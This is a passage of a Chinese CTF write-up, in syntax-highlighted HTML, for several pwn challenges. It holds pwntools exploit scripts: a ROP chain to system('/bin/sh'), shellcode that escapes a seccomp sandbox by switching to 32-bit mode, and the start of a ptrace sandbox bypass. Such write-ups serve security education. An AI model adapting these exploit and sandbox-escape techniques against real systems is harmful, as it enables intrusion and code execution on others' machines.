style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 16</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc_base </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_start_main </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">29d90</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"libc_start_main => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc_start_main</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">libc_base => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc_base</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">system </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">system</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">binsh </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#B8A965"> next</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">search</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000002a3e5</span><br><span style="color:#DBD7CAEE">ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00000000000f8c92</span><br><span style="color:#DBD7CAEE">edit</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">18</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdi_ret </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ffffffff</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">edit</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">20</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> binsh </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ffffffff</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">edit</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">21</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> binsh </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 32</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">edit</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">22</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ret </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ffffffff</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">edit</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">23</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ret </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 32</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">edit</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">24</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> system </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ffffffff</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">edit</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">25</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> system </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 32</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="door" class="scroll-target"><a href="#door"><code class="hash inline-code">#</code>door</a></h2>
<p>题目开了沙箱，会先 check shellcode 中 <code class="inline-code">syscall</code> 的数量，沙箱条件如下：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">line  CODE  JT   JF      K
=================================
0000: 0x20 0x00 0x00 0x00000000  A = sys_number
0001: 0x35 0x0a 0x00 0x40000000  if (A >= 0x40000000) goto 0012
0002: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0013
0003: 0x15 0x09 0x00 0x00000001  if (A == write) goto 0013
0004: 0x15 0x08 0x00 0x00000002  if (A == open) goto 0013
0005: 0x15 0x07 0x00 0x00000004  if (A == stat) goto 0013
0006: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0013
0007: 0x15 0x05 0x00 0x00000006  if (A == lstat) goto 0013
0008: 0x15 0x04 0x00 0x00000007  if (A == poll) goto 0013
0009: 0x15 0x03 0x00 0x00000008  if (A == lseek) goto 0013
0010: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0013
0011: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0013
0012: 0x06 0x00 0x00 0x00000000  return KILL
0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">line  CODE  JT   JF      K
=================================
0000: 0x20 0x00 0x00 0x00000000  A = sys_number
0001: 0x35 0x0a 0x00 0x40000000  if (A >= 0x40000000) goto 0012
0002: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0013
0003: 0x15 0x09 0x00 0x00000001  if (A == write) goto 0013
0004: 0x15 0x08 0x00 0x00000002  if (A == open) goto 0013
0005: 0x15 0x07 0x00 0x00000004  if (A == stat) goto 0013
0006: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0013
0007: 0x15 0x05 0x00 0x00000006  if (A == lstat) goto 0013
0008: 0x15 0x04 0x00 0x00000007  if (A == poll) goto 0013
0009: 0x15 0x03 0x00 0x00000008  if (A == lseek) goto 0013
0010: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0013
0011: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0013
0012: 0x06 0x00 0x00 0x00000000  return KILL
0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
</code></pre></div>
<p>这里预期解是用 <code class="inline-code">open</code> + <code class="inline-code">mmap</code> + <code class="inline-code">write</code>，我的解法是用 <code class="inline-code">retf</code> 切换指令集架构，然后打 orw。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./pwn</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">""</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    command </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">ps</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">-ax</span><span style="color:#B5695977">"</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    grep_command </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">grep</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> proc</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    ps_process </span><span style="color:#999999">=</span><span style="color:#393A34"> subprocess</span><span style="color:#999999">.</span><span style="color:#393A34">Popen</span><span style="color:#2993a3">(</span><span style="color:#393A34">command</span><span style="color:#999999">,</span><span style="color:#B07D48"> stdout</span><span style="color:#999999">=</span><span style="color:#393A34">subprocess</span><span style="color:#999999">.</span><span style="color:#A65E2B">PIPE</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    grep_process </span><span style="color:#999999">=</span><span style="color:#393A34"> subprocess</span><span style="color:#999999">.</span><span style="color:#393A34">Popen</span><span style="color:#2993a3">(</span><span style="color:#393A34">grep_command</span><span style="color:#999999">,</span><span style="color:#B07D48"> stdin</span><span style="color:#999999">=</span><span style="color:#393A34">ps_process</span><span style="color:#999999">.</span><span style="color:#393A34">stdout</span><span style="color:#999999">,</span><span style="color:#B07D48"> stdout</span><span style="color:#999999">=</span><span style="color:#393A34">subprocess</span><span style="color:#999999">.</span><span style="color:#A65E2B">PIPE</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    ps_process</span><span style="color:#999999">.</span><span style="color:#393A34">stdout</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    output </span><span style="color:#999999">=</span><span style="color:#393A34"> grep_process</span><span style="color:#999999">.</span><span style="color:#393A34">communicate</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#2993a3">[</span><span style="color:#2F798A">0</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    s </span><span style="color:#999999">=</span><span style="color:#393A34"> output</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#998418">    print</span><span style="color:#2993a3">(</span><span style="color:#393A34">s</span><span style="color:#999999">.</span><span style="color:#393A34">split</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    pid </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">s</span><span style="color:#999999">.</span><span style="color:#393A34">split</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#1e754f">[</span><span style="color:#2F798A">2</span><span style="color:#999999">:</span><span style="color:#2F798A">7</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#2F798A"> 10</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0">    # pause()</span><br><span style="color:#393A34">    attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">pid</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    b *0x401709</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">sc </span><span style="color:#999999">=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"""</span><br><span style="color:#B56959">xor esp, esp</span><br><span style="color:#B56959">mov rsp, 0x10500</span><br><span style="color:#B56959">mov eax, 0x23</span><br><span style="color:#B56959">mov [rsp+4], eax</span><br><span style="color:#B56959">mov eax, 0x1001b</span><br><span style="color:#B56959">mov [rsp], eax</span><br><span style="color:#B5695977">"""</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">sc </span><span style="color:#999999">+=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"""</span><br><span style="color:#B56959">.code32        # 添加此行指定32位模式</span><br><br><span style="color:#B56959">retf</span><br><br><span style="color:#B56959">mov eax, 5</span><br><span style="color:#B56959">xor ebx, ebx</span><br><span style="color:#B56959">xor ecx, ecx</span><br><span style="color:#B56959">mov ecx, 4</span><br><span style="color:#B56959">mov ebx, 0x10090</span><br><span style="color:#B56959">int 0x80</span><br><br><span style="color:#B56959">mov eax, 3</span><br><span style="color:#B56959">mov ebx, 3</span><br><span style="color:#B56959">mov ecx, 0x10900</span><br><span style="color:#B56959">mov edx, 0x100</span><br><span style="color:#B56959">int 0x80</span><br><br><span style="color:#B56959">mov eax, 4</span><br><span style="color:#B56959">mov ebx, 1</span><br><span style="color:#B56959">mov ecx, 0x10900</span><br><span style="color:#B56959">mov edx, 0x100</span><br><span style="color:#B56959">int 0x80</span><br><span style="color:#B5695977">"""</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">sc </span><span style="color:#999999">=</span><span style="color:#393A34"> sc</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">90</span><span style="color:#999999">,</span><span style="color:#393A34"> asm</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">ret</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">MADE IN HEAVEN !!!!!!!!!!!!!!!!</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">sc </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/flag</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./pwn</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">""</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    command </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">ps</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">-ax</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    grep_command </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">grep</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> proc</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    ps_process </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> subprocess</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Popen</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">command</span><span style="color:#666666">,</span><span style="color:#BD976A"> stdout</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">subprocess</span><span style="color:#666666">.</span><span style="color:#C99076">PIPE</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    grep_process </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> subprocess</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Popen</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">grep_command</span><span style="color:#666666">,</span><span style="color:#BD976A"> stdin</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">ps_process</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">stdout</span><span style="color:#666666">,</span><span style="color:#BD976A"> stdout</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">subprocess</span><span style="color:#666666">.</span><span style="color:#C99076">PIPE</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    ps_process</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">stdout</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    output </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> grep_process</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">communicate</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    s </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> output</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">    print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">split</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    pid </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">split</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">2</span><span style="color:#666666">:</span><span style="color:#4C9A91">7</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 10</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD">    # pause()</span><br><span style="color:#DBD7CAEE">    attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pid</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    b *0x401709</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">sc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"""</span><br><span style="color:#C98A7D">xor esp, esp</span><br><span style="color:#C98A7D">mov rsp, 0x10500</span><br><span style="color:#C98A7D">mov eax, 0x23</span><br><span style="color:#C98A7D">mov [rsp+4], eax</span><br><span style="color:#C98A7D">mov eax, 0x1001b</span><br><span style="color:#C98A7D">mov [rsp], eax</span><br><span style="color:#C98A7D77">"""</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">sc </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"""</span><br><span style="color:#C98A7D">.code32        # 添加此行指定32位模式</span><br><br><span style="color:#C98A7D">retf</span><br><br><span style="color:#C98A7D">mov eax, 5</span><br><span style="color:#C98A7D">xor ebx, ebx</span><br><span style="color:#C98A7D">xor ecx, ecx</span><br><span style="color:#C98A7D">mov ecx, 4</span><br><span style="color:#C98A7D">mov ebx, 0x10090</span><br><span style="color:#C98A7D">int 0x80</span><br><br><span style="color:#C98A7D">mov eax, 3</span><br><span style="color:#C98A7D">mov ebx, 3</span><br><span style="color:#C98A7D">mov ecx, 0x10900</span><br><span style="color:#C98A7D">mov edx, 0x100</span><br><span style="color:#C98A7D">int 0x80</span><br><br><span style="color:#C98A7D">mov eax, 4</span><br><span style="color:#C98A7D">mov ebx, 1</span><br><span style="color:#C98A7D">mov ecx, 0x10900</span><br><span style="color:#C98A7D">mov edx, 0x100</span><br><span style="color:#C98A7D">int 0x80</span><br><span style="color:#C98A7D77">"""</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">sc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> sc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">90</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">ret</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">MADE IN HEAVEN !!!!!!!!!!!!!!!!</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sc </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/flag</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="babytrace" class="scroll-target"><a href="#babytrace"><code class="hash inline-code">#</code>babytrace</a></h2>
<p>程序使用 ptrace 实现了一个沙箱，但是 <code class="inline-code">waitpid</code> 没有过滤 <code class="inline-code">SIGTRAP</code> 信号，可以用 <code class="inline-code">int1/3</code> 绕过。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">babytrace_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">""</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    command </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">ps</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">-ax</span><span style="color:#B5695977">"</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    grep_command </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">grep</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> proc</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    ps_process </span><span style="color:#999999">=</span><span style="color:#393A34"> subprocess</span><span style="color:#999999">.</span><span style="color:#393A34">Popen</span><span style="color:#2993a3">(</span><span style="color:#393A34">command</span><span style="color:#999999">,</span><span style="color:#B07D48"> stdout</span><span style="color:#999999">=</span><span style="color:#393A34">subprocess</span><span style="color:#999999">.</span><span style="color:#A65E2B">PIPE</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    